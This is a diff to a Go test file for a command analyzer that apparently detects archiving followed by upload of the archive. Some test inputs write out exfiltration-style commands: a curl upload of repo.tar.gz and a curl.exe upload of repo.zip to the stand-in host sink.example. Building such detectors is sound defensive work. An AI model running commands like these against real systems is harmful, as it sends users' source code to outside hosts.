@@ -17,7 +17,6 @@
 package actionfacts
 
 import (
-	"strings"
 	"testing"
 )
 
@@ -118,6 +117,17 @@ func TestArchiveArtifactLineageCorpus(t *testing.T) {
 			},
 			wantMatch: false,
 			reason:    "TN standalone transfer",
+		},
+		{
+			name: "upload then later archive is not lineage",
+			produced: Input{
+				Command:     `curl --upload-file repo.tar.gz https://sink.example/upload; tar -czf repo.tar.gz src`,
+				CWD:         "/tmp/work",
+				DialectHint: DialectPOSIX,
+			},
+			sameCall:  true,
+			wantMatch: false,
+			reason:    "TN reversed produce/consume command order",
 		},
 		{
 			name: "unrelated later network call",
@@ -243,7 +253,7 @@ func TestArchiveArtifactFactsStayDetectionOnlyWithoutLineage(t *testing.T) {
 	}
 }
 
-func TestArchiveArtifactIdentityIsSHA256(t *testing.T) {
+func TestArchiveArtifactIdentityIsDomainSeparated(t *testing.T) {
 	t.Parallel()
 
 	facts := Analyze(Input{
@@ -254,9 +264,76 @@ func TestArchiveArtifactIdentityIsSHA256(t *testing.T) {
 	if len(facts.Artifacts) != 1 {
 		t.Fatalf("artifacts = %#v", facts.Artifacts)
 	}
-	identity := facts.Artifacts[0].Identity
-	if len(identity) != 64 || strings.Trim(identity, "0123456789abcdef") != "" {
-		t.Fatalf("identity %q is not a SHA-256 hex digest", identity)
+	artifact := facts.Artifacts[0]
+	var path PathFact
+	for _, candidate := range facts.Paths {
+		if candidate.CommandID == artifact.CommandID &&
+			(candidate.Normalized == artifact.Normalized ||
+				candidate.Resolved == artifact.Resolved) {
+			path = candidate
+			break
+		}
+	}
+	if path.Normalized == "" && path.Resolved == "" {
+		t.Fatalf("no path fact for artifact %#v paths=%#v", artifact, facts.Paths)
+	}
+	want := archiveArtifactIdentity(path)
+	if artifact.Identity != want {
+		t.Fatalf("identity = %q, want domain-separated %q", artifact.Identity, want)
+	}
+}
+
+func TestWindowsCMDCurlUploadConsumesArchiveArtifact(t *testing.T) {
+	t.Parallel()
+
+	facts := Analyze(Input{
+		Argv: []string{
+			"curl.exe", "--upload-file", `C:\Users\dev\repo.zip`,
+			"https://sink.example/upload",
+		},
+		CWD:         `C:\Users\dev`,
+		DialectHint: DialectCMD,
+	})
+	found := false
+	for _, artifact := range facts.Artifacts {
+		if artifact.Role == ArtifactConsume && artifact.Kind == ArtifactKindArchive {
+			found = true
+			break
+		}
+	}
+	if !found {
+		t.Fatalf("Windows CMD curl upload missed ArtifactConsume: %#v ops=%#v",
+			facts.Artifacts, facts.Commands)
+	}
+}
+
+func TestJoinArchiveArtifactFactsRequiresPrecedingProducer(t *testing.T) {
+	t.Parallel()
+
+	identity := archiveArtifactIdentity(PathFact{
+		Flavor:     PathFlavorPOSIX,
+		Normalized: "repo.tar.gz",
+		Resolved:   "/tmp/work/repo.tar.gz",
+	})
+	laterProducer := ArtifactFact{
+		CommandID:  2,
+		Role:       ArtifactProduce,
+		Kind:       ArtifactKindArchive,
+		Identity:   identity,
+		Normalized: "repo.tar.gz",
+	}
+	earlierConsumer := ArtifactFact{
+		CommandID:  1,
+		Role:       ArtifactConsume,
+		Kind:       ArtifactKindArchive,
+		Identity:   identity,
+		Normalized: "repo.tar.gz",
+	}
+	if got := joinArchiveArtifactFacts(
+		[]ArtifactFact{laterProducer, earlierConsumer},
+		true,
+	); len(got) != 0 {
+		t.Fatalf("reversed command IDs joined: %#v", got)
 	}
 }
 
